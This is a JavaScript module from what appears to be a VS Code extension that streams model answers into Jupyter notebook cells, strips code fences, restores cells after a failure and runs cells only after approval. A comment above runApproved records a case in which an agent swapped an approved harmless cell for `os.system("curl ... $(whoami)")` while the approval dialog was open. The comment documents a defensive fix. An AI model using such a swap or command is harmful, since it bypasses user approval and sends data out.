'use strict';
const vscode = require('vscode');
const { log } = require('./log');

// Tokens arrive far faster than a notebook wants to be re-rendered. Buffer the
// raw stream and reconcile the cell document on a timer instead.
const FLUSH_MS = 60;

// Serialises cell creation so two concurrent inserts cannot claim one cell.
let insertLock = Promise.resolve();

/**
 * Removes markdown code fences from a model's answer.
 *
 * Two modes, because the question is genuinely different at the two times we ask
 * it. MID-STREAM we have only ever seen a prefix, so the answer must be
 * conservative and above all prefix-stable: text already written into the cell
 * must never be retracted, because setText is a full reconcile and a retraction
 * DELETES characters the user can already see.
 *
 * AT THE END the ambiguity is resolvable, and staying conservative starts
 * costing real content - `x` in R, a fence inside a triple-quoted string, a
 * fenced block nested inside another. Final mode is provably an EXTENSION of
 * what streaming emitted, never a contradiction of it: every position final
 * treats as a closing fence is also matched by streaming's /(^|\n)```/, so
 * final's candidates are a SUBSET of streaming's - and streaming takes the
 * first where final takes the last, so final's answer can only be longer.
 * The fuzzer in test/run.js checks both directions.
 *
 * Deliberately NOT normalised in final mode: a trailing \r from CRLF input
 * stays, because removing a byte streaming already emitted would be a
 * retraction. Do not "clean that up".
 *
 * Policy where the two readings genuinely cannot be told apart - two separate
 * fenced blocks look exactly like one block containing a fence: FAIL LOUD,
 * NEVER LOSE CONTENT. Stray fence markers in a cell are an obvious syntax
 * error; a silently discarded half of the answer is not.
 */
/**
 * A line start, for fence purposes: the beginning, a newline, or a BARE
 * carriage return.
 *
 * `\r(?!\n)` rather than plain `\r` is load-bearing. Inside CRLF the boundary
 * has to stay the \n, exactly as before, or the trailing \r that streaming
 * already emitted would be retracted - see the CRLF note above. A lone \r is a
 * different thing: it is the only line terminator that string has, and treating
 * it as ordinary text meant `indexOf('\n')` returned -1, the "body" began at the
 * opener's own backticks, and the WHOLE CELL came back empty. Measured:
 * '```python\rprint(1)\r```' produced '' in both modes.
 */
const LINE_START = String.raw`(^|\n|\r(?!\n))`;
/**
 * CommonMark allows a closing fence to be indented up to three spaces, and
 * models routinely indent fences inside a numbered list. The OPENER is already
 * de-indented by the leading-whitespace strip, which made this asymmetric and
 * easy to hit: the body came back with `  ``` ` still in it, guaranteeing a
 * SyntaxError in the cell. Applied to streaming and final alike, or final's
 * candidates would stop being a subset of streaming's.
 */
const INDENT = ' {0,3}';

function unfence(raw, { final = false } = {}) {
  const lead = raw.replace(/^\s+/, '');
  if (!lead) return '';
  if (final) return unfenceFinal(lead);
  // An opening fence may still be arriving ("`", "``", "```pyth"). Emit nothing
  // until we know whether it is a fence and which language tag it carries.
  if (/^`{1,3}[^\n\r]*$/.test(lead)) return '';
  if (!lead.startsWith('```')) return lead;
  // Where the opener's own line ends. For CRLF this is the \n, so the body
  // begins in exactly the same place it always did.
  const nl = lead.search(/\n|\r(?!\n)/);
  if (nl === -1) return '';
  const afterOpen = lead.slice(nl + 1);
  const close = afterOpen.search(new RegExp(`${LINE_START}${INDENT}\`\`\``));
  if (close !== -1) return afterOpen.slice(0, close);
  // No closing fence yet: hold back a tail that could turn out to be one,
  // because text already written into the cell must never be retracted.
  return afterOpen.replace(new RegExp(`(?:${LINE_START})${INDENT}\`{0,2}$`), '');
}

function unfenceFinal(lead) {
  // The answer is only fenced if its FIRST line is an opener. This is the branch
  // that used to swallow `x` and `my var` <- 5 whole: a single backtick is not a
  // fence, and at the end there is no "it might still become one".
  // \r\n first in the alternation, so CRLF consumes both and the body starts
  // where it always did; a bare \r is accepted as the terminator it is.
  const open = /^(`{3,})[^\n\r]*(\r\n|\n|\r|$)/.exec(lead);
  if (!open) return lead;
  if (!open[2]) return ''; // an opener and nothing after it
  const body = lead.slice(open[0].length);
  // The closer is the LAST line that is nothing but the marker - or more of it,
  // which CommonMark allows. Taking the FIRST one truncated at any fence the
  // code itself contained, which is how a docstring lost its second half.
  // Same line-start rule as streaming, so final's candidates stay a SUBSET of
  // streaming's - which is the whole reason final can only ever be longer.
  const closer = new RegExp(`${LINE_START}${INDENT}${open[1]}\`*[ \\t\\r]*(?=\\r|\\n|$)`, 'g');
  let at = -1;
  let m = closer.exec(body);
  while (m !== null) {
    at = m.index;
    closer.lastIndex = m.index + 1; // candidates may overlap
    m = closer.exec(body);
  }
  // Never closed: hand back everything rather than guess. This branch is what
  // makes final an extension of streaming rather than a contradiction of it.
  return at === -1 ? body : body.slice(0, at);
}

function notebookLanguage(notebook) {
  // Where the Jupyter serializer puts kernel metadata has moved between
  // versions, so check every shape before falling back to the cells themselves.
  const meta = notebook.metadata || {};
  const candidates = [meta.metadata, meta.custom && meta.custom.metadata, meta];
  for (const source of candidates) {
    if (!source) continue;
    const language =
      (source.kernelspec && source.kernelspec.language) ||
      (source.language_info && source.language_info.name);
    if (language) return String(language).toLowerCase();
  }
  for (const cell of notebook.getCells()) {
    if (cell.kind === vscode.NotebookCellKind.Code) return cell.document.languageId;
  }
  return 'python';
}

/**
 * Every notebook mutation goes through here. applyEdit returns false when the
 * edit could not be applied - a read-only or closed notebook - and three of the
 * four original call sites discarded that boolean, so a failed edit reported
 * success and autoRun then executed stale content.
 */
async function apply(edit, what) {
  if (!(await vscode.workspace.applyEdit(edit))) {
    throw new Error(`Could not ${what}. The notebook may be read-only or closed.`);
  }
}

/** 'markdown' or 'code', without every caller needing the vscode enum. */
function cellKindName(cell) {
  return cell.kind === vscode.NotebookCellKind.Markup ? 'markdown' : 'code';
}

function editorFor(notebook) {
  return vscode.window.visibleNotebookEditors.find((e) => e.notebook === notebook);
}

/**
 * Writes a stream of text into one notebook cell, live.
 *
 * Cell indexes shift when anything else edits the notebook, so the cell is
 * re-resolved from its document URI before every flush.
 */
class CellWriter {
  constructor(notebook, cell, { fenced = true, origin = 'insert', original = '' } = {}) {
    this.notebook = notebook;
    this.uri = cell.document.uri.toString();
    this.fenced = fenced;
    // Where this cell came from decides what abandoning it means: a cell we
    // created is deleted, a cell we borrowed is handed back untouched.
    this.origin = origin;
    this.original = original;
    this.raw = '';
    this.timer = undefined;
    this.flushing = Promise.resolve();
    this.closed = false;
    this.failed = undefined;
    // What we last put in the document. Anything else there means somebody
    // else has been editing, and we are no longer the owner of this cell.
    this.written = original;
    // Set once the cell has been handed back or removed. Distinct from `closed`,
    // which only means "no more streaming".
    this.released = false;
    // Set when the document diverged from `written` - the user typed. Kept
    // separate from `failed` on purpose: a foreign edit is not an error, and
    // end() must not throw for it.
    this.foreign = false;
    // The text abandon() put back, on the paths where it succeeded. Undefined
    // means there is nothing for keepPartial() to safely undo.
    this.restoredTo = undefined;
  }

  /** True once the model has produced text worth keeping. */
  produced() {
    return this.text({ final: true }).trim().length > 0;
  }

  static async insert(notebook, index, { kind = 'code', language, fenced = true } = {}) {
    const lang =
      language || (kind === 'markdown' ? 'markdown' : notebookLanguage(notebook));
    const cellKind =
      kind === 'markdown' ? vscode.NotebookCellKind.Markup : vscode.NotebookCellKind.Code;

    // Serialised, because the index is computed before an await and the cell is
    // claimed after it: two concurrent inserts used to bind to the same cell,
    // and one agent's content would silently overwrite the other's.
    const run = insertLock.then(async () => {
      const at = Math.max(0, Math.min(Math.floor(index) || 0, notebook.cellCount));
      const before = new Set(notebook.getCells().map((c) => c.document.uri.toString()));
      const data = new vscode.NotebookCellData(cellKind, '', lang);
      const edit = new vscode.WorkspaceEdit();
      edit.set(notebook.uri, [vscode.NotebookEdit.insertCells(at, [data])]);
      await apply(edit, 'insert a cell into the notebook');
      // Claim the cell by identity rather than by index, so a foreign edit that
      // lands during the await cannot hand us somebody else's cell.
      //
      // Nearest the index we asked for, not merely the first unrecognised cell
      // in document order. find() returned whichever new cell came first in the
      // notebook, so a user pressing "+ Code" ABOVE during the applyEdit window
      // made this claim THEIR brand-new cell and stream into it - the exact
      // scenario the identity check exists to prevent, answered with the wrong
      // cell. Measured.
      const fresh = notebook
        .getCells()
        .filter((c) => !before.has(c.document.uri.toString()));
      if (!fresh.length) throw new Error('The inserted cell could not be found.');
      const created = fresh.reduce((best, c) =>
        Math.abs(c.index - at) < Math.abs(best.index - at) ? c : best
      );
      return created;
    });
    insertLock = run.then(
      () => undefined,
      () => undefined
    );

    const cell = await run;
    const writer = new CellWriter(notebook, cell, { fenced, origin: 'insert' });
    writer.reveal();
    return writer;
  }

  /**
   * Streams into a cell that already exists.
   *
   * The cell is deliberately NOT cleared up front: setText diffs from whatever
   * the document currently holds, so the user's code stays intact until the
   * model's first token lands. Clearing early meant that the likeliest failure
   * of all - no API key on a first run - destroyed their work.
   */
  static async replace(notebook, cell, { fenced } = {}) {
    const writer = new CellWriter(notebook, cell, {
      // Revising a markdown cell must not strip its fenced code blocks.
      fenced: fenced !== undefined ? fenced : cell.kind === vscode.NotebookCellKind.Code,
      origin: 'replace',
      original: cell.document.getText(),
    });
    writer.reveal();
    return writer;
  }

  get index() {
    const cell = this.cell();
    return cell ? cell.index : -1;
  }

  cell() {
    return this.notebook.getCells().find((c) => c.document.uri.toString() === this.uri);
  }

  reveal() {
    const editor = editorFor(this.notebook);
    const cell = this.cell();
    if (!editor || !cell) return;
    const range = new vscode.NotebookRange(cell.index, cell.index + 1);
    editor.selection = range;
    editor.revealRange(range, vscode.NotebookEditorRevealType.Default);
  }

  write(chunk) {
    if (this.closed || !chunk) return;
    this.raw += chunk;
    if (this.timer) return;
    this.timer = setTimeout(() => {
      this.timer = undefined;
      this.flush();
    }, FLUSH_MS);
  }

  flush() {
    // A closed writer must never touch the document again. Without this guard a
    // late flush lands AFTER abandon() has restored the user's original text and
    // overwrites it with the failed partial - the old test only passed because
    // setText happened to no-op on a cell that had been deleted.
    if (this.closed) return this.flushing;
    // Serialise flushes: overlapping applyEdit calls race on the same document.
    this.flushing = this.flushing
      .then(() => this.setText(this.text()))
      .catch((err) => {
        if (!this.failed) this.failed = err;
        log('flush failed:', err && err.message ? err.message : String(err));
      });
    return this.flushing;
  }

  text({ final = false } = {}) {
    const body = this.fenced ? unfence(this.raw, { final }) : this.raw;
    return body.replace(/^\n+/, '');
  }

  /**
   * Returns whether the document now holds `target`.
   *
   * This used to return nothing, and every refusal below was therefore silent.
   * That is what let abandon() report `restored: true` after declining to
   * restore anything, and the caller then told the user their cell had been put
   * back when it had not. A refusal the caller cannot see is the bug; the
   * refusals themselves are all correct.
   */
  async setText(target, { force = false } = {}) {
    if (this.closed && !force) return false;
    // A released writer owns nothing. `force` used to bypass this, which is how
    // end() could overwrite a restore that abandon() had just performed.
    if (this.released) return false;
    const cell = this.cell();
    if (!cell) return false;
    const doc = cell.document;
    const current = doc.getText();
    // Already exactly right - nothing to do, but the document does hold the
    // target, so this is a success and not a refusal.
    if (current === target) return true;
    if (!this.owns(current)) {
      // Somebody typed into the cell we were streaming into. Stop rather than
      // overwrite: the model's text is still in `raw` and can be offered, but
      // what the user typed cannot be reconstructed.
      this.foreign = true;
      return false;
    }
    // Rewrite only the tail that actually changed, so the editor does not
    // re-render the whole cell on every token.
    let keep = 0;
    const limit = Math.min(current.length, target.length);
    while (keep < limit && current[keep] === target[keep]) keep += 1;
    const edit = new vscode.WorkspaceEdit();
    edit.replace(
      doc.uri,
      new vscode.Range(doc.positionAt(keep), doc.positionAt(current.length)),
      target.slice(keep)
    );
    await apply(edit, 'write into the cell');
    // Recorded only after the edit lands, so our own writes never look foreign.
    this.written = target;
    return true;
  }

  /**
   * Is the document still exactly what we last put there?
   *
   * A save can trim trailing whitespace out from under us, which is not a person
   * typing, so that one difference is tolerated - setText diffs against the
   * document rather than against `written`, so it self-corrects on the next
   * write. Anything else means the user is in the cell.
   *
   * Not airtight: there is an await between reading the document and the edit
   * landing, so a keystroke inside that window is still lost. The window is one
   * event-loop turn rather than the 60ms flush interval, and the next write
   * notices. It stops; it never reverts.
   */
  owns(current) {
    if (current === this.written) return true;
    return current.replace(/\s+$/, '') === this.written.replace(/\s+$/, '');
  }

  /**
   * Final reconcile. Returns the text that is actually in the document now -
   * not the text we meant to write, which used to be reported as success even
   * when every edit had failed.
   *
   * Execution is deliberately not decided here; see src/policy.js.
   */
  async end({ trim = true } = {}) {
    // A writer that has handed its cell back has nothing left to finish. This is
    // a programming error rather than a user-visible one, and throwing is what
    // keeps it unreachable.
    if (this.released) {
      throw new Error('this cell was abandoned; there is nothing left to finish.');
    }
    // Close BEFORE awaiting: a write landing during these awaits used to arm a
    // timer that nothing afterwards would ever clear.
    this.closed = true;
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = undefined;
    }
    const final = trim
      ? this.text({ final: true }).replace(/\s+$/, '')
      : this.text({ final: true });
    // Assigned back into the chain so the final write is serialised with the
    // flushes, instead of racing them.
    this.flushing = this.flushing.then(() => this.setText(final, { force: true }));
    await this.flushing;
    if (this.failed) throw this.failed;
    const cell = this.cell();
    if (!cell) throw new Error('The cell being written was removed from the notebook.');
    return cell.document.getText();
  }

  /**
   * Undo everything this writer did.
   *
   * An inserted cell is removed; a borrowed cell is handed back with exactly
   * the text it had before streaming began. Restoring is itself an undoable
   * edit, so a user who would rather keep the partial gets it with one Ctrl+Z -
   * whereas reconstructing lost work by hand has no such shortcut.
   *
   * Never called for a cancellation: someone who cancels keeps what arrived.
   */
  async abandon() {
    // Idempotent: the bridge can reach this twice through nested catches.
    if (this.released) return { restored: false, partial: this.text({ final: true }) };
    this.closed = true;
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = undefined;
    }
    await this.flushing.catch(() => {});
    const partial = this.text({ final: true });
    const cell = this.cell();
    if (!cell) return { restored: false, partial };

    if (this.origin === 'insert') {
      const edit = new vscode.WorkspaceEdit();
      edit.set(this.notebook.uri, [
        vscode.NotebookEdit.deleteCells(new vscode.NotebookRange(cell.index, cell.index + 1)),
      ]);
      await apply(edit, 'remove the cell');
      this.released = true;
      return { restored: true, partial };
    }

    // Restore first, release second: releasing early would refuse our own
    // restoring write.
    //
    // The result is passed on rather than assumed. setText correctly declines
    // when the user has typed into the cell - it cannot overwrite what they
    // wrote - and this used to report `restored: true` anyway, so the caller
    // told them their cell had been put back while their original was gone.
    const restored = await this.setText(this.original, { force: true });
    this.released = true;
    // What the cell holds because of us, so keepPartial can tell "still as I
    // left it" from "the user has been typing since".
    this.restoredTo = restored ? this.original : undefined;
    return { restored, partial };
  }

  /**
   * Put the model's partial back after a restore, because the user asked for it.
   *
   * This deliberately re-acquires the cell that abandon() released, and is the
   * only way back in. `force` used to serve this purpose, and `force` was also
   * what let end() silently overwrite a restore.
   *
   * Narrow on purpose. It used to re-sync `written` from whatever the document
   * held, which made owns() pass unconditionally and turned this into a blind
   * force-write: offered after a restore that had been DECLINED, it overwrote
   * the very text the user had typed - losing their original and then their
   * typing too. It now goes ahead only when the cell still holds exactly what
   * this writer's own restore put there.
   */
  async keepPartial(text) {
    // Never abandoned, so there is no restore to undo and the cell is live.
    if (!this.released || this.restoredTo === undefined) return false;
    const cell = this.cell();
    if (!cell) return false;
    const current = cell.document.getText();
    if (current !== this.restoredTo) return false;
    this.released = false;
    this.foreign = false;
    this.written = current;
    const ok = await this.setText(text, { force: true });
    this.released = true;
    return ok;
  }

  /** Back-compat alias; the bridge still calls this. Removed in phase 4. */
  async drop() {
    const { restored } = await this.abandon();
    return restored;
  }
}

async function runCell(notebook, index) {
  try {
    await vscode.commands.executeCommand('notebook.cell.execute', {
      ranges: [{ start: index, end: index + 1 }],
      document: notebook.uri,
    });
  } catch (err) {
    log('could not execute cell', index, '-', err && err.message);
  }
}

/**
 * Run a cell only if it still holds the exact text that was approved.
 *
 * An approval is for a specific piece of code, and nothing used to check that
 * the code had not changed since. Measured: with bridge.execution 'ask', an
 * agent pushed a cell, the modal showed `print("totally harmless")`, a second
 * request rewrote that same cell while the dialog was open, the user clicked
 * Run, and `os.system("curl -s https://.../$(whoami)")` executed. Three HTTP
 * calls, one prompt, and the preview was never what ran.
 *
 * Also the one place that refuses index -1, which is what `writer.index` becomes
 * once the cell is gone - executing range [-1, 0) is not a range anyone meant.
 *
 * Returns false when it declined, so the caller can say why.
 */
async function runApproved(notebook, index, approved) {
  if (!Number.isInteger(index) || index < 0 || index >= notebook.cellCount) return false;
  const cell = notebook.cellAt(index);
  if (!cell) return false;
  if (typeof approved === 'string' && cell.document.getText() !== approved) return false;
  await runCell(notebook, index);
  return true;
}

/**
 * Cut a string to length without splitting a surrogate pair in half.
 *
 * slice() works on UTF-16 code units, so cutting mid-emoji leaves a lone
 * surrogate - which cannot be encoded as UTF-8 at all. Measured: /cells handed
 * back `source` that this project's OWN cellText then refused on the way back
 * in, so a read-modify-write client broke on our own output; and clipped prompt
 * context reached the model as U+FFFD.
 */
function clipText(s, limit) {
  if (s.length <= limit) return s;
  let head = s.slice(0, limit);
  const last = head.charCodeAt(head.length - 1);
  if (last >= 0xd800 && last <= 0xdbff) head = head.slice(0, -1);
  return `${head}\n...<truncated>`;
}

const OUTPUT_MIMES = [
  'application/vnd.code.notebook.stdout',
  'application/vnd.code.notebook.stderr',
  'text/plain',
];

/** Human-readable outputs for a cell: errors first, then stdout/stderr/text. */
function readOutputs(cell, { limit = 1200 } = {}) {
  const errors = [];
  const text = [];
  for (const output of cell.outputs || []) {
    for (const item of output.items || []) {
      // The two guards above are careful and then this loop assumed every item
      // had both fields, so one odd item turned Fix the Error into a TypeError.
      // An item with no mime cannot be interpreted and one with no data has
      // nothing to interpret, so neither is worth reporting.
      if (!item || typeof item.mime !== 'string' || item.data === undefined || item.data === null) {
        continue;
      }
      const body = Buffer.from(item.data).toString('utf8');
      if (item.mime === 'application/vnd.code.notebook.error') {
        try {
          const err = JSON.parse(body);
          const stack = (err.stack || '').split('\n').slice(0, 12).join('\n');
          errors.push([`${err.name || 'Error'}: ${err.message || ''}`, stack].join('\n').trim());
        } catch {
          errors.push(body);
        }
      } else if (OUTPUT_MIMES.includes(item.mime)) {
        text.push(body);
      } else if (item.mime.startsWith('image/')) {
        text.push(`<${item.mime} output>`);
      }
    }
  }
  // Reported rather than done silently: /cells used to derive its `truncated`
  // flag from the source clip alone, so a response whose OUTPUTS were clipped
  // said nothing had been - while carrying "...<truncated>" in the body.
  let truncated = false;
  const clip = (s) => {
    if (s.length <= limit) return s;
    truncated = true;
    return clipText(s, limit);
  };
  const error = errors.length ? clip(errors.join('\n\n')) : '';
  const text_ = text.length ? clip(text.join('')) : '';
  return { error, text: text_, truncated };
}

module.exports = {
  CellWriter,
  clipText,
  runCell,
  runApproved,
  readOutputs,
  notebookLanguage,
  editorFor,
  cellKindName,
  unfence,
};
